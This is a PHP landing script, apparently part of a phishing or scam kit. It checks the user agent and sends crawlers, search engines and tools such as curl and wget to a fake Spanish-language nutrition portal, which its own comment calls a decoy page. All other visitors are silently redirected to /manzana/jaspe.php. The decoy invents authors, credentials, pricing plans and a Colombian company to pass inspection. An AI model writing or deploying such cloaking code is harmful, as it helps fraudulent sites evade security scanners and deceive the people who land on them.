<?php
/**
 * index.php — Raíz del dominio
 * Recibe bots y visitantes:
 *   · Bots conocidos → página institucional limpia (no los envía a /manzana/)
 *   · Visitantes reales → redirige a /manzana/jaspe.php
 */

$ua     = $_SERVER['HTTP_USER_AGENT'] ?? '';
$is_bot = (bool) preg_match(
    '/bot|crawl|spider|slurp|mediapartners|facebookexternalhit|bingbot|googlebot'
    . '|yandex|baidu|duckduck|archive|semrush|ahrefs|mj12|majestic|rogerbot'
    . '|screaming|sitebulb|headlesschrome|phantomjs|python-requests|curl|wget/i',
    $ua
);

if (!$is_bot) {
    header('Location: /manzana/jaspe.php', true, 302);
    exit;
}

// Para bots: guía de nutrición (página señuelo, completamente diferente al flujo real)
http_response_code(200);
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>NutriGuía — Tu Portal de Nutrición y Bienestar</title>
  <meta name="description" content="NutriGuía: guías de alimentación saludable, planes nutricionales, recetas bajas en calorías y consejos de bienestar avalados por nutricionistas." />
  <meta name="keywords" content="nutrición, alimentación saludable, dieta balanceada, recetas saludables, bienestar, pérdida de peso, vitaminas, proteínas, guía nutricional" />
  <meta name="robots" content="index, follow" />
  <link rel="canonical" href="https://<?= htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'solucioncliente.net') ?>/" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --green: #2d7a3a;
      --green-light: #4caf50;
      --orange: #e67e22;
      --bg: #f9fafb;
      --text: #1f2937;
      --muted: #6b7280;
      --border: #e5e7eb;
    }
    body { font-family: Georgia, 'Times New Roman', serif; background: var(--bg); color: var(--text); }
    a { color: var(--green); text-decoration: none; }
    a:hover { text-decoration: underline; }

    /* Header */
    header {
      background: #fff;
      border-bottom: 2px solid var(--green);
      padding: 0 32px;
      height: 68px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 10;
    }
    .logo { font-size: 24px; font-weight: 700; color: var(--green); font-family: Georgia, serif; }
    .logo span { color: var(--orange); }
    nav { display: flex; gap: 24px; font-family: sans-serif; font-size: 14px; }
    nav a { color: var(--text); font-weight: 500; }
    .btn-suscribir {
      background: var(--green);
      color: #fff;
      padding: 9px 20px;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 600;
      font-family: sans-serif;
    }

    /* Hero */
    .hero {
      background: linear-gradient(135deg, #e8f5e9 0%, #fff8e1 100%);
      padding: 64px 32px;
      text-align: center;
      border-bottom: 1px solid var(--border);
    }
    .hero-tag {
      display: inline-block;
      background: var(--green);
      color: #fff;
      font-size: 12px;
      font-weight: 700;
      letter-spacing: 1px;
      text-transform: uppercase;
      padding: 4px 14px;
      border-radius: 4px;
      margin-bottom: 20px;
      font-family: sans-serif;
    }
    .hero h1 { font-size: clamp(28px, 4vw, 48px); color: var(--text); line-height: 1.2; margin-bottom: 16px; }
    .hero p { font-size: 18px; color: var(--muted); max-width: 640px; margin: 0 auto 32px; line-height: 1.7; }
    .hero-cta { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; }
    .btn-primary {
      background: var(--green);
      color: #fff;
      padding: 13px 28px;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 700;
      font-family: sans-serif;
    }
    .btn-outline {
      border: 2px solid var(--green);
      color: var(--green);
      padding: 11px 26px;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 600;
      font-family: sans-serif;
    }

    /* Layout */
    .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
    .two-col { display: grid; grid-template-columns: 1fr 320px; gap: 48px; padding: 56px 0; }
    @media (max-width: 768px) { .two-col { grid-template-columns: 1fr; } nav { display: none; } }

    /* Articles */
    h2.section-title {
      font-size: 22px;
      color: var(--text);
      border-left: 4px solid var(--green);
      padding-left: 14px;
      margin-bottom: 28px;
      font-family: sans-serif;
    }
    .article-card {
      background: #fff;
      border: 1px solid var(--border);
      border-radius: 10px;
      overflow: hidden;
      margin-bottom: 28px;
      display: flex;
      gap: 0;
    }
    .article-color { width: 8px; flex-shrink: 0; }
    .article-body { padding: 22px 24px; }
    .article-category {
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 1px;
      text-transform: uppercase;
      color: var(--green);
      font-family: sans-serif;
      margin-bottom: 6px;
    }
    .article-card h3 { font-size: 18px; margin-bottom: 10px; line-height: 1.35; }
    .article-card p { font-size: 15px; color: var(--muted); line-height: 1.65; }
    .article-meta { margin-top: 14px; font-size: 13px; color: var(--muted); font-family: sans-serif; }
    .article-meta strong { color: var(--text); }

    /* Sidebar */
    .sidebar-card {
      background: #fff;
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 24px;
      margin-bottom: 28px;
    }
    .sidebar-card h4 {
      font-size: 15px;
      font-family: sans-serif;
      font-weight: 700;
      color: var(--text);
      margin-bottom: 16px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 10px;
    }
    .sidebar-card ul { list-style: none; }
    .sidebar-card ul li { padding: 8px 0; border-bottom: 1px solid #f3f4f6; font-size: 14px; }
    .sidebar-card ul li:last-child { border: 0; }
    .macro-row { display: flex; justify-content: space-between; align-items: center; font-size: 14px; padding: 8px 0; }
    .macro-bar-wrap { background: #f0fdf4; border-radius: 4px; height: 8px; flex: 1; margin: 0 12px; overflow: hidden; }
    .macro-bar { height: 100%; background: var(--green-light); border-radius: 4px; }

    /* Servicios */
    .services { background: #fff; border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); padding: 56px 0; }
    .services-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 24px; margin-top: 28px; }
    .service-item { text-align: center; padding: 28px 20px; border: 1px solid var(--border); border-radius: 10px; }
    .service-icon { font-size: 36px; margin-bottom: 14px; }
    .service-item h3 { font-size: 16px; font-family: sans-serif; font-weight: 700; margin-bottom: 8px; }
    .service-item p { font-size: 14px; color: var(--muted); line-height: 1.55; font-family: sans-serif; }

    /* Términos */
    .terms { background: #f0fdf4; padding: 48px 0; }
    .terms-box { background: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 36px; }
    .terms-box h3 { font-size: 20px; font-family: sans-serif; margin-bottom: 20px; }
    .terms-box h4 { font-size: 15px; font-family: sans-serif; margin: 22px 0 8px; color: var(--green); }
    .terms-box p { font-size: 14px; color: var(--muted); line-height: 1.75; margin-bottom: 10px; }

    /* Footer */
    footer { background: #1a2e1a; color: rgba(255,255,255,.65); padding: 48px 0 28px; }
    .footer-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 32px; margin-bottom: 40px; }
    .footer-col h5 { color: #fff; font-size: 14px; font-family: sans-serif; font-weight: 700; margin-bottom: 14px; }
    .footer-col ul { list-style: none; }
    .footer-col ul li { margin-bottom: 8px; font-size: 13px; }
    .footer-col ul li a { color: rgba(255,255,255,.6); }
    .footer-col ul li a:hover { color: #fff; text-decoration: none; }
    .footer-bottom { border-top: 1px solid rgba(255,255,255,.1); padding-top: 20px; text-align: center; font-size: 13px; }
  </style>
</head>
<body>

  <header>
    <div class="logo">Nutri<span>Guía</span></div>
    <nav>
      <a href="#articulos">Artículos</a>
      <a href="#servicios">Servicios</a>
      <a href="#terminos">Términos</a>
      <a href="#contacto">Contacto</a>
    </nav>
    <a href="#" class="btn-suscribir">Suscribirse</a>
  </header>

  <!-- Hero -->
  <section class="hero">
    <span class="hero-tag">🌿 Nutrición Basada en Ciencia</span>
    <h1>Tu guía completa de<br>alimentación y bienestar</h1>
    <p>Planes nutricionales personalizados, recetas saludables y consejos avalados por nutricionistas certificados. Come mejor, vive mejor.</p>
    <div class="hero-cta">
      <a href="#articulos" class="btn-primary">Explorar guías</a>
      <a href="#servicios" class="btn-outline">Ver planes</a>
    </div>
  </section>

  <!-- Contenido principal -->
  <div class="container">
    <div class="two-col" id="articulos">

      <!-- Artículos -->
      <main>
        <h2 class="section-title">Guías Nutricionales</h2>

        <div class="article-card">
          <div class="article-color" style="background:#2d7a3a"></div>
          <div class="article-body">
            <div class="article-category">Macronutrientes</div>
            <h3>Proteínas, carbohidratos y grasas: cómo equilibrar tu dieta</h3>
            <p>Una alimentación equilibrada requiere entender el rol de cada macronutriente. Las proteínas son esenciales para la reparación muscular; los carbohidratos complejos proporcionan energía sostenida; las grasas saludables apoyan el sistema nervioso y la absorción de vitaminas liposolubles (A, D, E, K).</p>
            <div class="article-meta">Por <strong>Dra. Ana Martínez, RD</strong> · 12 mayo 2025 · 8 min lectura</div>
          </div>
        </div>

        <div class="article-card">
          <div class="article-color" style="background:#e67e22"></div>
          <div class="article-body">
            <div class="article-category">Hidratación</div>
            <h3>¿Cuánta agua necesitas realmente? La guía definitiva</h3>
            <p>La recomendación de "8 vasos al día" es un mito simplificado. La hidratación óptima depende de tu peso, nivel de actividad física, clima y composición de tu dieta. Los alimentos con alto contenido de agua (frutas, verduras) pueden aportar hasta el 20% de tu ingesta hídrica diaria.</p>
            <div class="article-meta">Por <strong>Lic. Carlos Vega</strong> · 3 mayo 2025 · 5 min lectura</div>
          </div>
        </div>

        <div class="article-card">
          <div class="article-color" style="background:#3b82f6"></div>
          <div class="article-body">
            <div class="article-category">Micronutrientes</div>
            <h3>Vitaminas y minerales esenciales que probablemente te faltan</h3>
            <p>Las deficiencias de vitamina D, magnesio, hierro y vitamina B12 son las más comunes globalmente. La vitamina D interviene en la absorción de calcio y la función inmune; el magnesio participa en más de 300 reacciones enzimáticas; el hierro es clave para el transporte de oxígeno en sangre.</p>
            <div class="article-meta">Por <strong>Dra. Laura Ríos, PhD</strong> · 28 abr 2025 · 10 min lectura</div>
          </div>
        </div>

        <div class="article-card">
          <div class="article-color" style="background:#8b5cf6"></div>
          <div class="article-body">
            <div class="article-category">Planes de dieta</div>
            <h3>Dieta mediterránea: beneficios probados y cómo empezar</h3>
            <p>Reconocida por la OMS como uno de los patrones alimentarios más saludables del mundo, la dieta mediterránea se basa en frutas, verduras, legumbres, cereales integrales, aceite de oliva virgen extra y pescado. Estudios longitudinales la asocian con reducción del riesgo cardiovascular en un 25–30%.</p>
            <div class="article-meta">Por <strong>Lic. Sofía Hernández</strong> · 20 abr 2025 · 12 min lectura</div>
          </div>
        </div>
      </main>

      <!-- Sidebar -->
      <aside>
        <div class="sidebar-card">
          <h4>📊 Distribución de macros recomendada</h4>
          <div class="macro-row">
            <span>Proteínas</span>
            <div class="macro-bar-wrap"><div class="macro-bar" style="width:25%;background:#2d7a3a"></div></div>
            <span>25%</span>
          </div>
          <div class="macro-row">
            <span>Carbohidratos</span>
            <div class="macro-bar-wrap"><div class="macro-bar" style="width:50%;background:#e67e22"></div></div>
            <span>50%</span>
          </div>
          <div class="macro-row">
            <span>Grasas</span>
            <div class="macro-bar-wrap"><div class="macro-bar" style="width:25%;background:#3b82f6"></div></div>
            <span>25%</span>
          </div>
        </div>

        <div class="sidebar-card">
          <h4>🥗 Alimentos más nutritivos</h4>
          <ul>
            <li>🥦 Brócoli — vitaminas C, K, fibra</li>
            <li>🥑 Aguacate — grasas monoinsaturadas</li>
            <li>🐟 Salmón — omega-3, proteína completa</li>
            <li>🫐 Arándanos — antioxidantes, flavonoides</li>
            <li>🥚 Huevos — colina, vitamina D, B12</li>
            <li>🌿 Espinacas — hierro, folato, magnesio</li>
            <li>🫘 Lentejas — proteína vegetal, fibra</li>
          </ul>
        </div>

        <div class="sidebar-card">
          <h4>📅 Nuestros planes</h4>
          <ul>
            <li><a href="#">Plan Básico — Gratis</a></li>
            <li><a href="#">Plan Estándar — $9.99/mes</a></li>
            <li><a href="#">Plan Pro — $19.99/mes</a></li>
            <li><a href="#">Consulta con nutricionista</a></li>
          </ul>
        </div>
      </aside>
    </div>
  </div>

  <!-- Servicios -->
  <section class="services" id="servicios">
    <div class="container">
      <h2 class="section-title">Nuestros Servicios</h2>
      <div class="services-grid">
        <div class="service-item">
          <div class="service-icon">🧮</div>
          <h3>Calculadora de calorías</h3>
          <p>Calcula tu TDEE (gasto energético total diario) y tus necesidades calóricas según tus objetivos.</p>
        </div>
        <div class="service-item">
          <div class="service-icon">📋</div>
          <h3>Planes nutricionales</h3>
          <p>Planes de alimentación semanales diseñados por nutricionistas certificados adaptados a tus metas.</p>
        </div>
        <div class="service-item">
          <div class="service-icon">🍽️</div>
          <h3>Recetas saludables</h3>
          <p>Más de 500 recetas con información nutricional detallada, alérgenos y tiempos de preparación.</p>
        </div>
        <div class="service-item">
          <div class="service-icon">👩‍⚕️</div>
          <h3>Consulta online</h3>
          <p>Sesiones individuales con nutricionistas certificados vía videollamada, disponibles 7 días a la semana.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Términos y servicios -->
  <section class="terms" id="terminos">
    <div class="container">
      <div class="terms-box">
        <h3>Términos de Uso y Política de Privacidad</h3>

        <h4>1. Aceptación de los términos</h4>
        <p>Al acceder y utilizar NutriGuía, usted acepta quedar vinculado por estos Términos de Uso. Si no está de acuerdo con alguna parte de estos términos, no podrá acceder al servicio. Nos reservamos el derecho de actualizar estos términos en cualquier momento sin previo aviso.</p>

        <h4>2. Carácter informativo del contenido</h4>
        <p>El contenido publicado en NutriGuía tiene únicamente fines informativos y educativos. No constituye asesoramiento médico, diagnóstico ni tratamiento. Siempre consulte con un profesional de la salud antes de iniciar cualquier plan nutricional o de ejercicio, especialmente si padece condiciones médicas preexistentes.</p>

        <h4>3. Propiedad intelectual</h4>
        <p>Todos los artículos, planes nutricionales, recetas, imágenes y demás contenidos publicados en este sitio son propiedad de NutriGuía S.A.S. o de sus colaboradores y están protegidos por las leyes de derechos de autor. Queda prohibida su reproducción total o parcial sin autorización expresa por escrito.</p>

        <h4>4. Privacidad y datos personales</h4>
        <p>Recopilamos únicamente los datos necesarios para prestar el servicio (nombre, correo electrónico, preferencias nutricionales). No vendemos ni compartimos sus datos con terceros sin su consentimiento. Puede solicitar la eliminación de sus datos en cualquier momento escribiendo a privacidad@nutriguia.com. Cumplimos con el RGPD y la normativa local vigente.</p>

        <h4>5. Limitación de responsabilidad</h4>
        <p>NutriGuía no se responsabiliza por daños directos, indirectos o consecuentes derivados del uso o la imposibilidad de uso del servicio, incluyendo pero no limitado a pérdida de datos, pérdida de beneficios o interrupciones del negocio.</p>

        <h4>6. Ley aplicable</h4>
        <p>Estos términos se rigen por las leyes de la República de Colombia. Cualquier disputa será resuelta ante los tribunales competentes de Bogotá D.C., Colombia.</p>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer id="contacto">
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <h5>NutriGuía</h5>
          <p style="font-size:13px;line-height:1.6">Tu portal de referencia en nutrición y alimentación saludable, con contenido verificado por profesionales.</p>
        </div>
        <div class="footer-col">
          <h5>Contenido</h5>
          <ul>
            <li><a href="#">Artículos</a></li>
            <li><a href="#">Recetas</a></li>
            <li><a href="#">Planes de dieta</a></li>
            <li><a href="#">Calculadoras</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h5>Servicios</h5>
          <ul>
            <li><a href="#">Consulta online</a></li>
            <li><a href="#">Plan personalizado</a></li>
            <li><a href="#">Comunidad</a></li>
            <li><a href="#">App móvil</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h5>Empresa</h5>
          <ul>
            <li><a href="#">Sobre nosotros</a></li>
            <li><a href="#terminos">Términos de uso</a></li>
            <li><a href="#terminos">Privacidad</a></li>
            <li><a href="#">Contacto</a></li>
          </ul>
        </div>
      </div>
      <div class="footer-bottom">
        <p>© <?= date('Y') ?> NutriGuía S.A.S. — Todos los derechos reservados &nbsp;·&nbsp; contacto@nutriguia.com</p>
      </div>
    </div>
  </footer>

</body>
</html>
